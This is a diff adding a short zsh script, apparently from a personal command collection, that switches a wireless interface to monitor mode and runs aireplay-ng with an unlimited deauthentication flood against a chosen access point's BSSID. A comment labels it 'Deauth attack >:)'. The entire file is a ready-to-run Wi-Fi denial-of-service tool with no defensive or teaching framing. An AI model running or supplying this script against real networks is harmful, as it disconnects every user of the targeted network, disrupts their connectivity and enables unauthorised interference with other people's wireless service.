@@ -1,0 +1,18 @@
+#!/usr/bin/env zsh
+# vim:ft=sh
+emulate -L zsh; setopt extendedglob warncreateglobal; set -o pipefail
+need_installed aireplay-ng iwconfig ifconfig || return $? # Check if command installed || exit
+need_normal_user || return $? # Only normal user can run || exit
+must_have_argument $1 || return $? # Must have argument-1 passed || exit 
+must_have_argument $2 || return $? # Must have argument-2 passed || exit 
+
+local bssid="${2}" # Store argument-2 to local variable
+local interface="${1}" # Store argument-1 to local variable
+if [[ ! "$(get-info interface_mode ${interface})" == "Mode:Monitor" ]]; then # Check if interface mode is not Monitor-mode then:
+    sudo ifconfig ${interface} down                         # Stop the interface
+    sudo iwconfig ${interface} mode Monitor                 # Change interface mode to Monitor-mode
+    sudo ifconfig ${interface} up                           # Start the interface 
+    sudo aireplay-ng -a ${bssid} --deauth 0 ${interface}    # Deauth attack >:)
+else 
+    sudo aireplay-ng -a ${bssid} --deauth 0 ${interface}    # Deauth attack >:)
+fi # End if-else statement
